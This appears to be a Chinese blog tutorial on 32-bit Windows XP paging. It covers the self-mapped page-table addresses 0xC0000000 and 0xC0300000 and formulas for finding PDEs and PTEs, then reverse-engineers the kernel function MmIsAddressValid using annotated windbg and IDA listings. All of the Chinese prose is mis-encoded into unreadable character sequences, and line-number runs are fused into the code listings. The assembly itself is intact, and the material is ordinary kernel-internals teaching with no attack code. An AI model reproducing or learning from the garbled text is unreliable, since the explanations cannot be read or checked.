è§‚å¯ŸAæ–¹å¼æŸ¥çœ‹åˆ°çš„ç¬¬1å¼ PTTè¡¨ å’Œ é€šè¿‡æ­¥éª¤abcæ‹†åˆ†çº¿æ€§åœ°å€0xC0000000è¾“å‡ºçš„å†…å®¹ï¼ˆçº¿æ€§åœ°å€0xC0000000å¯¹åº”çš„ç‰©ç†é¡µï¼‰ï¼Œå¾—å‡ºç»“è®ºï¼š çº¿æ€§åœ°å€0xC0000000æ‰¾åˆ°çš„ç‰©ç†é¡µæ˜¯ç¬¬ä¸€å¼ PTTè¡¨ è§‚å¯ŸAæ–¹å¼æŸ¥çœ‹åˆ°çš„ç¬¬2å¼ PTTè¡¨ å’Œ é€šè¿‡æ­¥éª¤abcæ‹†åˆ†çº¿æ€§åœ°å€0xC0001000è¾“å‡ºçš„å†…å®¹ï¼ˆçº¿æ€§åœ°å€0xC0001000å¯¹åº”çš„ç‰©ç†é¡µï¼‰ï¼Œå¾—å‡ºç»“è®ºï¼š çº¿æ€§åœ°å€0xC0001000æ‰¾åˆ°çš„ç‰©ç†é¡µæ˜¯ç¬¬äºŒå¼ PTTè¡¨ 0xC0000000å’Œ0xC0001000é—´éš”0x1000ï¼Œ4kbï¼Œå› ä¸ºä¸€å¼ PTTè¡¨å¤§å°4kbã€‚ æ€»ç»“ 1ã€é¡µè¡¨è¢«æ˜ å°„åˆ°äº†ä»0xC0000000åˆ°0xC03FFFFFçš„4Måœ°å€ç©ºé—´ 1å¼ é¡µè¡¨4kbï¼Œæœ‰1024å¼ ï¼Œä¸€å…±å¤§å°1024*4kb=4M 2ã€åœ¨è¿™1024ä¸ªè¡¨ä¸­æœ‰ä¸€å¼ ç‰¹æ®Šçš„è¡¨:é¡µç›®å½•è¡¨ ç¬¬0x300å¼ è¡¨ï¼Œåè¿›åˆ¶768 3ã€é¡µç›®å½•è¡¨è¢«æ˜ å°„åˆ°äº†0xC0300000å¼€å§‹å¤„çš„4Kåœ°å€ç©ºé—´ å†æ¬¡å¯¹åˆ†é¡µæ¨¡å¼çš„å›¾è¿›è¡Œè¡¥å……ï¼š windbgè‡ªåŠ¨è®¡ç®—ç‰©ç†é¡µçš„æŒ‡ä»¤ ä¼šè‡ªåŠ¨è®¡ç®—å‡ºè¯¥çº¿æ€§åœ°å€å¯¹åº”çš„PDEã€PTEã€ç‰©ç†é¡µ 1!vtop &lt;CR3&gt; &lt;çº¿æ€§åœ°å€&gt; æœ‰äº†è¿™ä¸¤ä¸ªåŸºå€èƒ½åšä»€ä¹ˆï¼Ÿ æœ‰äº†0xC0300000å’Œ0xC0000000èƒ½åšä»€ä¹ˆï¼Ÿå¦‚æœæŒæ¡äº†è¿™ä¸¤ä¸ªåœ°å€ï¼Œå°±æŒæ¡äº†ä¸€ä¸ªè¿›ç¨‹æ‰€æœ‰ç‰©ç†å†…å­˜çš„è¯»å†™æƒé™ã€‚ çº¿æ€§åœ°å€0xC0300000ï¼ŒæŒ‡å‘äº†é¡µç›®å½•è¡¨ï¼ˆï¼ˆå®ƒå…¶å®æ˜¯ç¬¬0x300å¼ é¡µè¡¨ï¼‰ï¼‰ã€‚é€šè¿‡0xC0300000ï¼Œå¯ä»¥æ‰¾åˆ°ä»»ä½•ä¸€ä¸ªçº¿æ€§åœ°å€çš„PDEã€‚ çº¿æ€§åœ°å€0xC0000000ï¼ŒæŒ‡å‘äº†ç¬¬ä¸€å¼ é¡µè¡¨ï¼Œåˆå› ä¸º1024å¼ é¡µè¡¨æ˜¯è¿ç»­çš„ï¼ˆç‰©ç†é¡µä¸è¿ç»­ï¼‰ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥é€šè¿‡è®¡ç®—æ‰¾åˆ°ä»»ä½•ä¸€ä¸ªPTEã€‚ PDIï¼ˆIndexï¼‰ï¼šåœ¨PDTè¡¨ä¸­çš„ç´¢å¼•ã€‚PTIï¼ˆIndexï¼‰ï¼šåœ¨PTTè¡¨ä¸­çš„ç´¢å¼•ã€‚ åˆ†åˆ«å¯¹åº”10-10-12çš„å‰ä¸¤ä¸ª10ã€‚ å¯»æ‰¾PDEçš„å…¬å¼å¦‚ä¸‹ï¼š è®¿é—®é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰çš„å…¬å¼ï¼š0xC0300000 + PDI * 4 å¯»æ‰¾PTEçš„å…¬å¼å¦‚ä¸‹ï¼š è®¿é—®é¡µè¡¨ï¼ˆPTTï¼‰çš„å…¬å¼ï¼š0xC0000000 + PDI * 4096 + PTI * 4 è§£é‡Šä¸€ä¸‹ç¬¬äºŒæ¡å…¬å¼ï¼ŒPDI*4KBæ˜¯æ‰¾åˆ°çº¿æ€§åœ°å€æ‰€åœ¨çš„é¡µè¡¨ï¼Œå› ä¸º1024å¼ é¡µè¡¨æ˜¯è¿ç»­çš„ã€‚æ‰¾åˆ°é¡µè¡¨åï¼ŒPTI * 4æ‰¾é¡µè¡¨é¡¹PTEã€‚ è¯¾åç»ƒä¹  é€†å‘åˆ†æMmIsAddressValidå‡½æ•° å¦‚ä½•æ‰¾åˆ°è¿™ä¸ªå‡½æ•°windbgçš„ufå‘½ä»¤IDA12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152kd&gt; uf MmIsAddressValidnt!MmIsAddressValid:804e4661 8bff mov edi,edi804e4663 55 push ebp804e4664 8bec mov ebp,esp804e4666 8b4d08 mov ecx,dword ptr [ebp+8]804e4669 8bc1 mov eax,ecx804e466b c1e814 shr eax,14h804e466e bafc0f0000 mov edx,0FFCh804e4673 23c2 and eax,edx804e4675 2d0000d03f sub eax,3FD00000h804e467a 8b00 mov eax,dword ptr [eax]804e467c a801 test al,1804e467e 0f84d2f10000 je nt!MmIsAddressValid+0x4f (804f3856)nt!MmIsAddressValid+0x1f:804e4684 84c0 test al,al804e4686 7824 js nt!MmIsAddressValid+0x53 (804e46ac)nt!MmIsAddressValid+0x23:804e4688 c1e90a shr ecx,0Ah804e468b 81e1fcff3f00 and ecx,3FFFFCh804e4691 81e900000040 sub ecx,40000000h804e4697 8bc1 mov eax,ecx804e4699 8b08 mov ecx,dword ptr [eax]804e469b f6c101 test cl,1804e469e 0f84b2f10000 je nt!MmIsAddressValid+0x4f (804f3856)nt!MmIsAddressValid+0x3b:804e46a4 84c9 test cl,cl804e46a6 0f88b6de0300 js nt!MmIsAddressValid+0x3f (80522562)nt!MmIsAddressValid+0x53:804e46ac b001 mov al,1nt!MmIsAddressValid+0x55:804e46ae 5d pop ebp804e46af c20400 ret 4nt!MmIsAddressValid+0x4f:804f3856 32c0 xor al,al804f3858 e9510effff jmp nt!MmIsAddressValid+0x55 (804e46ae)nt!MmIsAddressValid+0x3f:80522562 23c2 and eax,edx80522564 8b80000030c0 mov eax,dword ptr [eax-3FD00000h]8052256a 66258100 and ax,81h8052256e 3c81 cmp al,81h80522570 0f853621fcff jne nt!MmIsAddressValid+0x53 (804e46ac)nt!MmIsAddressValid+0x53:80522576 e9db12fdff jmp nt!MmIsAddressValid+0x4f (804f3856)å‚è€ƒï¼šä¿æŠ¤æ¨¡å¼ç¯‡â€”â€”æ®µå’Œé—¨å°ç»“-ç¾½å¤çš„åšå®¢-ç»ƒä¹ é¢˜7ç­”æ¡ˆå…ˆæ‰¾åˆ°å†…æ ¸æ–‡ä»¶ï¼Œåœ¨C:\\WINDOWS\\system32è·¯å¾„ä¸‹ï¼š10-10-12åˆ†é¡µæ¨¡å¼ä¸‹ï¼Œå†…æ ¸æ–‡ä»¶ä¸ºntoskrnl.exe2-9-9-12åˆ†é¡µæ¨¡å¼ä¸‹ï¼Œå†…æ ¸æ–‡ä»¶ä¸ºntkrnlpa.exeå…¶ä»–ç³»ç»Ÿå¯ä»¥ç”¨PCHunterç¡®è®¤ï¼Œä¸‹å›¾æ˜¯æˆ‘åœ¨32ä½xpç³»ç»Ÿï¼ˆç”¨çš„10-10-12åˆ†é¡µï¼‰æ‰“å¼€çš„ç¬¦å·æ–‡ä»¶ç”¨PDBDownloadä¸‹è½½ï¼šhttps://www.cnblogs.com/onetrainee/p/11767895.htmlPDBDownloadä¸‹è½½é“¾æ¥ï¼šhttps://techcommunity.microsoft.com/t5/iis-support-blog/pdb-downloader/ba-p/342969æ‰“å¼€IDAï¼Œç„¶åæŠŠntoskrnl.exeæ‹–è¿›å»ï¼Œç„¶åIDAè¯¢é—®æ£€æµ‹åˆ°è°ƒè¯•ä¿¡æ¯ï¼Œæ˜¯å¦ä»å¾®è½¯æœåŠ¡å™¨ä¸‹è½½ç¬¦å·ï¼Œç‚¹å‡»å¦ã€‚å› ä¸ºWinXPçš„ç¬¦å·å¾®è½¯æ—©ä¸æäº†ã€‚ç„¶åè‡ªå·±åŠ è½½ç¬¦å·ï¼Œæ‰“å¼€åŠ è½½ç¬¦å·æ–‡ä»¶ï¼šFile-&gt;Load file-&gt;PDB fileã€‚Alt+Tï¼Œæœç´¢å®šä½åˆ°MmIsAddressValidï¼Œç„¶åå¼€å§‹åˆ†æã€‚123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869.text:0040C661 ; =============== S U B R O U T I N E =======================================.text:0040C661.text:0040C661 ; Attributes: bp-based frame.text:0040C661.text:0040C661 ; BOOLEAN __stdcall MmIsAddressValid(PVOID VirtualAddress).text:0040C661 public MmIsAddressValid.text:0040C661 MmIsAddressValid proc near ; CODE XREF: sub_40D65E+Câ†“p.text:0040C661 ; sub_415459:loc_415470â†“p ....text:0040C661.text:0040C661 VirtualAddress = dword ptr 8.text:0040C661.text:0040C661 ; FUNCTION CHUNK AT .text:0041B856 SIZE 00000007 BYTES.text:0040C661 ; FUNCTION CHUNK AT .text:0044A562 SIZE 00000019 BYTES.text:0040C661.text:0040C661 mov edi, edi.text:0040C663 push ebp.text:0040C664 mov ebp, esp.text:0040C666 mov ecx, [ebp+VirtualAddress].text:0040C669 mov eax, ecx.text:0040C66B shr eax, 14h.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx.text:0040C675 sub eax, 3FD00000h.text:0040C67A mov eax, [eax].text:0040C67C test al, 1.text:0040C67E jz loc_41B856.text:0040C684 test al, al.text:0040C686 js short loc_40C6AC.text:0040C688 shr ecx, 0Ah.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, 40000000h.text:0040C697 mov eax, ecx.text:0040C699 mov ecx, [eax].text:0040C69B test cl, 1.text:0040C69E jz loc_41B856.text:0040C6A4 test cl, cl.text:0040C6A6 js loc_44A562.text:0040C6AC.text:0040C6AC loc_40C6AC: ; CODE XREF: MmIsAddressValid+25â†‘j.text:0040C6AC ; MmIsAddressValid+3DF0Fâ†“j.text:0040C6AC mov al, 1.text:0040C6AE.text:0040C6AE loc_40C6AE: ; CODE XREF: MmIsAddressValid+F1F7â†“j.text:0040C6AE pop ebp.text:0040C6AF retn 4.text:0040C6AF MmIsAddressValid endp.text:0041B856 ; ---------------------------------------------------------------------------.text:0041B856 ; START OF FUNCTION CHUNK FOR MmIsAddressValid.text:0041B856.text:0041B856 loc_41B856: ; CODE XREF: MmIsAddressValid+1Dâ†‘j.text:0041B856 ; MmIsAddressValid+3Dâ†‘j ....text:0041B856 xor al, al.text:0041B858 jmp loc_40C6AE.text:0041B858 ; END OF FUNCTION CHUNK FOR MmIsAddressValid.text:0041B85D ; ---------------------------------------------------------------------------.text:0044A562 ; ---------------------------------------------------------------------------.text:0044A562 ; START OF FUNCTION CHUNK FOR MmIsAddressValid.text:0044A562.text:0044A562 loc_44A562: ; CODE XREF: MmIsAddressValid+45â†‘j.text:0044A562 and eax, edx.text:0044A564 mov eax, [eax-3FD00000h].text:0044A56A and ax, 81h.text:0044A56E cmp al, 81h.text:0044A570 jnz loc_40C6AC.text:0044A576 jmp loc_41B856.text:0044A576 ; END OF FUNCTION CHUNK FOR MmIsAddressValid.text:0044A57B ; ---------------------------------------------------------------------------åˆ†æè¯¦ç»†åˆ†æä¸€è§ˆåˆ†æå‡½æ•°åå­—åœ°å€æ˜¯å¦æœ‰æ•ˆå‡½æ•°è¿”å›å€¼ç±»å‹æ˜¯å¸ƒå°”ï¼Œå‚æ•°æ˜¯DWORDç±»å‹çš„VirtualAddress123.text:0040C661 ; BOOLEAN __stdcall MmIsAddressValid(PVOID VirtualAddress).text:0040C661 VirtualAddress = dword ptr 8123.text:0040C661 mov edi, edi ; çƒ­è¡¥ä¸.text:0040C663 push ebp.text:0040C664 mov ebp, esp ; æ–°çš„æ ˆå¸§å–å‡ºå‡½æ•°å‚æ•°ç»™ecx1.text:0040C666 mov ecx, [ebp+VirtualAddress]å¯»æ‰¾PDEï¼Œå¯¹PDEå­—æ®µçš„åˆ¤æ–­ä»32ä½çº¿æ€§åœ°å€å¾—åˆ°PDI*4ï¼Œç„¶å+é¡µç›®å½•è¡¨åŸºå€0xC0300000hå»æ‰¾PDEã€‚å–å‡º32ä½çº¿æ€§åœ°å€çš„PDIå¹¶Ã—4ï¼Œè¿™æ®µä»£ç ç”¨çš„æ˜¯ä½è¿ç®—ï¼Œæ³¨æ„ä½“ä¼šï¼š123.text:0040C66B shr eax, 20 ; å³ç§»20ä½ï¼Œé«˜ä½è¡¥0.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx ; ä½ä¸¤ä½æ¸…ç©ºï¼Œå‰©10ä½çº¿æ€§åœ°å€å³ç§»20ä½åï¼Œå‰©12ä½ï¼Œé«˜ä½è¡¥0ï¼›ç„¶åå’Œ0x0FFChç›¸ä¸ï¼Œå°†ä½2ä½æ¸…0ï¼ˆç›¸å½“äºå·¦ç§»2ä½ï¼Œå®Œæˆ2^2è¿ç®—ï¼Œå³Ã—4ï¼‰ã€‚åˆ¤æ–­PDEçš„Pä½å¦‚æœP=1ï¼Œæœ‰æ•ˆï¼Œç»§ç»­åˆ¤æ–­PDEçš„PSä½å¦‚æœæ˜¯PS=1ï¼ˆå¤§é¡µï¼‰ï¼Œè·³è½¬åˆ°short loc_40C6ACï¼Œå‡½æ•°è¿”å›å€¼ç»™1ï¼Œè°ƒç”¨ç»“æŸå¦‚æœPS=0ï¼ˆå°é¡µï¼‰ï¼Œç»§ç»­æ‰§è¡Œï¼Œæ‰¾PTEå¦‚æœP=0ï¼Œæ— æ•ˆï¼Œè·³è½¬åˆ°loc_41B856ï¼Œå‡½æ•°è¿”å›å€¼ç»™0ï¼Œè°ƒç”¨ç»“æŸ12345678910111213.text:0040C669 mov eax, ecx.text:0040C66B shr eax, 20 ; å³ç§»20ä½ï¼Œé«˜ä½è¡¥0.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx ; ä½ä¸¤ä½æ¸…ç©ºï¼Œå‰©10ä½.text:0040C675 sub eax, -0C0300000h ; é¡µç›®å½•è¡¨åŸºå€ã€‚eax+=0xC0300000h.text:0040C67A mov eax, [eax] ; å–[eax]å¤„åœ°å€å­˜å‚¨çš„å€¼ï¼šPDE.text:0040C67C test al, 1 ; åˆ¤æ–­PDEçš„Pä½.text:0040C67E jz loc_41B856 ; å¦‚æœal=0ï¼Œè¡¨æ˜è¯¥PDEçš„Pä½æ— æ•ˆï¼ŒZFç½®1ï¼Œjzè·³è½¬åˆ°loc_41B856ï¼Œï¼›.text:0040C67E ; å¦‚æœal=1ï¼Œè¡¨æ˜è¯¥PDEçš„Pä½æœ‰æ•ˆï¼ŒZFç½®0ï¼Œjzä¸è·³è½¬.text:0040C684 test al, al ; åˆ¤æ–­PSä½.text:0040C686 js short loc_40C6AC ; alä¸alç›¸ä¸å.text:0040C686 ; å¦‚æœç¬¦å·ä½æ˜¯1ï¼ŒSF=1ï¼Œè¡¨æ˜PS=1ï¼Œæ˜¯å¤§é¡µï¼Œjsè·³è½¬åˆ°short loc_40C6ACï¼š.text:0040C686 ; å¦‚æœç¬¦å·ä½æ˜¯0ï¼ŒSF=0ï¼Œè¡¨æ˜PS=0ï¼Œæ˜¯å°é¡µï¼Œjsä¸è·³è½¬å¯»æ‰¾PTEï¼Œå¯¹PTEå­—æ®µçš„åˆ¤æ–­ä»32ä½çº¿æ€§åœ°å€å¾—åˆ°PDIÃ—0x1000+PTIÃ—4+é¡µè¡¨åŸºå€0xC0000000hå»æ‰¾PTEã€‚å¾—åˆ°PDIÃ—0x1000+PTIÃ—4è¿™æ®µä»£ç ç”¨çš„æ˜¯ä½è¿ç®—ï¼Œæ³¨æ„ä½“ä¼šï¼š123.text:0040C688 shr ecx, 10 ; å³ç§»10ä½ï¼Œé«˜ä½è¡¥0.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, -0C0000000h ; é¡µè¡¨åŸºå€ã€‚eax+=0xC0000000hçº¿æ€§åœ°å€å³ç§»10ä½åï¼Œå‰©22ä½ï¼Œé«˜ä½è¡¥0ï¼›ç„¶åå’Œ3FFFFChç›¸ä¸ï¼Œå°†ä½2ä½æ¸…0ã€‚è¿™ä¸ªå€¼æ˜¯ä»€ä¹ˆï¼Ÿä»è¿ç®—çš„è§’åº¦ä¸Šçœ‹ï¼šPDI||PTI||00PTIé•¿åº¦æ˜¯10ä½ï¼Œæ‰€ä»¥PDIå·¦ç§»äº†10ä½ã€‚(PDIÃ—2^10+PTI)ï¼Œç„¶åä½ä¸¤ä½ä¸º0ï¼Œæ•´ä½“Ã—4ï¼Œè¿™ä¸ªå€¼æ˜¯(PDIÃ—2^10+PTI)Ã—4=(PDIÃ—0x400+PTI)Ã—4=PDIÃ—0x1000+PTIÃ—4ä»å«ä¹‰ä¸Šçœ‹ï¼šPDIè¡¨ç¤ºåœ¨ç¬¬å‡ ä¸ªPDTè¡¨ï¼Œæ¯ä¸ªPDTè¡¨å¤§å°4kbã€‚PTIè¡¨ç¤ºåœ¨PTTè¡¨ä¸­çš„ç¬¬å‡ é¡¹ï¼Œæ¯ä¸€é¡¹4å­—èŠ‚ã€‚æ‰€ä»¥æ˜¯é¡µè¡¨åŸºå€+PDIÃ—0x1000+PTIÃ—4ã€‚è¿™ä¸ªå°±æ˜¯æ–‡ç« å‰è¾¹æçš„å¯»PTEå…¬å¼ã€‚123456789101112.text:0040C688 shr ecx, 10 ; å³ç§»10ä½ï¼Œé«˜ä½è¡¥0.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, -0C0000000h ; é¡µè¡¨åŸºå€ã€‚eax+=0xC0000000h.text:0040C697 mov eax, ecx.text:0040C699 mov ecx, [eax].text:0040C69B test cl, 1 ; åˆ¤æ–­Pä½.text:0040C69E jz loc_41B856 ; è¿”å›0ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æ— æ•ˆ.text:0040C6A4 test cl, cl ; PTEæœ€é«˜ä½æ˜¯PATä½ï¼Œåˆ¤æ–­PATä½æ˜¯å¦ä¸º1.text:0040C6A6 js loc_44A562 ; alä¸alç›¸ä¸å.text:0040C6A6 ; å¦‚æœç¬¦å·ä½æ˜¯1ï¼ŒSF=1ï¼Œè¡¨æ˜PAT=1ï¼Œè¯¥é¡µç”¨äºå­˜å‚¨ç¼“å­˜ç›¸å…³æ•°æ®ï¼Œæ—¢ä¸å¯ä½œä¸ºæ•°æ®æ®µï¼Œä¹Ÿä¸å¯ä½œä¸ºä»£ç æ®µæ‰§è¡Œï¼Œè·³è½¬åˆ°loc_44A562.text:0040C6A6 ; å¦‚æœç¬¦å·ä½æ˜¯0ï¼ŒSF=0ï¼Œè¡¨æ˜PAT=0ï¼Œjsä¸è·³è½¬.text:0040C6ACPAT=1åï¼Œè·³è½¬åˆ°loc_44A562ï¼š12345678910111213141516.text:0044A562 ; ---------------------------------------------------------------------------.text:0044A562 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A562.text:0044A562 loc_44A562: ; CODE XREF: MmIsAddressValid(x)+45â†‘j.text:0044A562 and eax, edx ; eaxï¼šPDIÃ—0x1000+PTIÃ—4.text:0044A562 ; edxï¼š0x0FFCh.text:0044A562 ; andåå¾—åˆ°PDEæŒ‡é’ˆ.text:0044A564 mov eax, [eax+0C0300000h] ; PDEæŒ‡é’ˆ+é¡µç›®å½•è¡¨åŸºå€0xC0300000hï¼Œå¾—åˆ°PDEçš„å€¼.text:0044A56A and ax, 10000001b ; åˆ¤æ–­PDEçš„PSä½å’ŒPä½.text:0044A56E cmp al, 10000001b ; al-81h.text:0044A56E ; å¦‚æœç»“æœä¸º0ï¼ŒZF=1ï¼Œè¡¨æ˜PSä½å’ŒPä½éƒ½ä¸º1ï¼Œæœ‰æ•ˆä¸”æ˜¯å¤§é¡µï¼Œjnzè·³è½¬åˆ°loc_40C6AC.text:0044A56E ; å¦‚æœç»“æœä¸ä¸º0ï¼ŒZF=0ï¼Œè¡¨æ˜PSä½å’ŒPä½ä¸åŒæ—¶ä¸º1ï¼Œjnzä¸è·³è½¬ï¼Œé¡ºåºæ‰§è¡Œï¼Œç„¶åjmp loc_41B856.text:0044A570 jnz loc_40C6AC ; è¿”å›1ï¼Œè¯¥çº¿æ€§åœ°å€æœ‰æ•ˆ.text:0044A576 jmp loc_41B856 ; è¿”å›0ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æ— æ•ˆ.text:0044A576 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A57B ; ---------------------------------------------------------------------------å‡½æ•°è¿”å›å€¼æƒ…å†µï¼šè¿”å›0ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æ— æ•ˆ123456789.text:0041B856 ; ---------------------------------------------------------------------------.text:0041B856 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B856.text:0041B856 loc_41B856: ; CODE XREF: MmIsAddressValid(x)+1Dâ†‘j.text:0041B856 ; MmIsAddressValid(x)+3Dâ†‘j ....text:0041B856 xor al, al ; è¿”å›0ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æ— æ•ˆ.text:0041B858 jmp loc_40C6AE.text:0041B858 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B85D ; ---------------------------------------------------------------------------è¿”å›1ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æœ‰æ•ˆ12345678910.text:0040C6AC loc_40C6AC: ; CODE XREF: MmIsAddressValid(x)+25â†‘j.text:0040C6AC ; MmIsAddressValid(x)+3DF0Fâ†“j.text:0040C6AC mov al, 1 ; è¿”å›1ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æœ‰æ•ˆ.text:0040C6AE.text:0040C6AE loc_40C6AE: ; CODE XREF: MmIsAddressValid(x)+F1F7â†“j.text:0040C6AE pop ebp ; ç»“æŸè°ƒç”¨ï¼Œå¹³æ ˆ.text:0040C6AF retn 4.text:0040C6AF _MmIsAddressValid@4 endp.text:0040C6AF.text:0040C6B2 ; ---------------------------------------------------------------------------æµç¨‹å›¾ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253.text:0040C661 ; =============== S U B R O U T I N E =======================================.text:0040C661.text:0040C661 ; Attributes: bp-based frame.text:0040C661.text:0040C661 ; BOOLEAN __stdcall MmIsAddressValid(PVOID VirtualAddress).text:0040C661 public _MmIsAddressValid@4.text:0040C661 _MmIsAddressValid@4 proc near ; CODE XREF: MiMakeSystemAddressValidPfn(x)+Câ†“p.text:0040C661 ; MiMakeSystemAddressValidPfnWs(x,x):loc_415470â†“p ....text:0040C661.text:0040C661 VirtualAddress = dword ptr 8.text:0040C661.text:0040C661 ; FUNCTION CHUNK AT .text:0041B856 SIZE 00000007 BYTES.text:0040C661 ; FUNCTION CHUNK AT .text:0044A562 SIZE 00000019 BYTES.text:0040C661.text:0040C661 mov edi, edi ; æ‰“è¡¥ä¸ç”¨çš„.text:0040C663 push ebp.text:0040C664 mov ebp, esp ; ä¿æŠ¤ç°åœº.text:0040C666 mov ecx, [ebp+VirtualAddress].text:0040C669 mov eax, ecx.text:0040C66B shr eax, 20 ; å³ç§»20ä½ï¼Œé«˜ä½è¡¥0.text:0040C66E mov edx, 0FFCh.text:0040C673 and eax, edx.text:0040C675 sub eax, -0C0300000h ; é¡µç›®å½•è¡¨åŸºå€ã€‚eax+=0xC0300000h.text:0040C67A mov eax, [eax] ; å–[eax]å¤„åœ°å€å­˜å‚¨çš„å€¼ï¼šPDE.text:0040C67C test al, 1 ; åˆ¤æ–­PDEçš„Pä½.text:0040C67E jz loc_41B856 ; å¦‚æœal=0ï¼Œè¡¨æ˜è¯¥PDEçš„Pä½æ— æ•ˆï¼ŒZFç½®1ï¼Œjzè·³è½¬åˆ°loc_41B856ï¼Œï¼›.text:0040C67E ; å¦‚æœal=1ï¼Œè¡¨æ˜è¯¥PDEçš„Pä½æœ‰æ•ˆï¼ŒZFç½®0ï¼Œjzä¸è·³è½¬.text:0040C684 test al, al ; åˆ¤æ–­PSä½.text:0040C686 js short loc_40C6AC ; alä¸alç›¸ä¸å.text:0040C686 ; å¦‚æœç¬¦å·ä½æ˜¯1ï¼ŒSF=1ï¼Œè¡¨æ˜PS=1ï¼Œæ˜¯å¤§é¡µï¼Œjsè·³è½¬åˆ°short loc_40C6ACï¼š.text:0040C686 ; å¦‚æœç¬¦å·ä½æ˜¯0ï¼ŒSF=0ï¼Œè¡¨æ˜PS=0ï¼Œæ˜¯å°é¡µï¼Œjsä¸è·³è½¬.text:0040C688 shr ecx, 10 ; å³ç§»10ä½ï¼Œé«˜ä½è¡¥0.text:0040C68B and ecx, 3FFFFCh.text:0040C691 sub ecx, -0C0000000h ; é¡µè¡¨åŸºå€ã€‚eax+=0xC0000000h.text:0040C697 mov eax, ecx.text:0040C699 mov ecx, [eax].text:0040C69B test cl, 1 ; åˆ¤æ–­Pä½.text:0040C69E jz loc_41B856 ; è¿”å›0ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æ— æ•ˆ.text:0040C6A4 test cl, cl ; PTEæœ€é«˜ä½æ˜¯PATä½ï¼Œåˆ¤æ–­PATä½æ˜¯å¦ä¸º1.text:0040C6A6 js loc_44A562 ; alä¸alç›¸ä¸å.text:0040C6A6 ; å¦‚æœç¬¦å·ä½æ˜¯1ï¼ŒSF=1ï¼Œè¡¨æ˜PAT=1ï¼Œè¯¥é¡µç”¨äºå­˜å‚¨ç¼“å­˜ç›¸å…³æ•°æ®ï¼Œæ—¢ä¸å¯ä½œä¸ºæ•°æ®æ®µï¼Œä¹Ÿä¸å¯ä½œä¸ºä»£ç æ®µæ‰§è¡Œï¼Œè·³è½¬åˆ°loc_44A562.text:0040C6A6 ; å¦‚æœç¬¦å·ä½æ˜¯0ï¼ŒSF=0ï¼Œè¡¨æ˜PAT=0ï¼Œjsä¸è·³è½¬.text:0040C6AC.text:0040C6AC loc_40C6AC: ; CODE XREF: MmIsAddressValid(x)+25â†‘j.text:0040C6AC ; MmIsAddressValid(x)+3DF0Fâ†“j.text:0040C6AC mov al, 1 ; è¿”å›1ï¼Œè¯¥çº¿æ€§åœ°å€æœ‰æ•ˆ.text:0040C6AE.text:0040C6AE loc_40C6AE: ; CODE XREF: MmIsAddressValid(x)+F1F7â†“j.text:0040C6AE pop ebp.text:0040C6AF retn 4.text:0040C6AF _MmIsAddressValid@4 endp.text:0040C6AF.text:0040C6B2 ; ---------------------------------------------------------------------------123456789.text:0041B856 ; ---------------------------------------------------------------------------.text:0041B856 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B856.text:0041B856 loc_41B856: ; CODE XREF: MmIsAddressValid(x)+1Dâ†‘j.text:0041B856 ; MmIsAddressValid(x)+3Dâ†‘j ....text:0041B856 xor al, al ; è¿”å›0ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æ— æ•ˆ.text:0041B858 jmp loc_40C6AE.text:0041B858 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0041B85D ; ---------------------------------------------------------------------------12345678910111213141516.text:0044A562 ; ---------------------------------------------------------------------------.text:0044A562 ; START OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A562.text:0044A562 loc_44A562: ; CODE XREF: MmIsAddressValid(x)+45â†‘j.text:0044A562 and eax, edx ; eaxï¼šPDIÃ—0x1000+PTIÃ—4.text:0044A562 ; edxï¼š0x0FFCh.text:0044A562 ; andåå¾—åˆ°PDEæŒ‡é’ˆ.text:0044A564 mov eax, [eax+0C0300000h] ; PDEæŒ‡é’ˆ+é¡µç›®å½•è¡¨åŸºå€0xC0300000hï¼Œå¾—åˆ°PDEçš„å€¼.text:0044A56A and ax, 10000001b ; åˆ¤æ–­PDEçš„PSä½å’ŒPä½.text:0044A56E cmp al, 10000001b ; al-81h.text:0044A56E ; å¦‚æœç»“æœä¸º0ï¼ŒZF=1ï¼Œè¡¨æ˜PSä½å’ŒPä½éƒ½ä¸º1ï¼Œæœ‰æ•ˆä¸”æ˜¯å¤§é¡µï¼Œjnzè·³è½¬åˆ°loc_40C6AC.text:0044A56E ; å¦‚æœç»“æœä¸ä¸º0ï¼ŒZF=0ï¼Œè¡¨æ˜PSä½å’ŒPä½ä¸åŒæ—¶ä¸º1ï¼Œjnzä¸è·³è½¬ï¼Œé¡ºåºæ‰§è¡Œï¼Œç„¶åjmp loc_41B856.text:0044A570 jnz loc_40C6AC ; è¿”å›1ï¼Œè¯¥çº¿æ€§åœ°å€æœ‰æ•ˆ.text:0044A576 jmp loc_41B856 ; è¿”å›0ï¼Œè¡¨ç¤ºè¿™ä¸ªçº¿æ€§åœ°å€æ— æ•ˆ.text:0044A576 ; END OF FUNCTION CHUNK FOR MmIsAddressValid(x).text:0044A57B ; 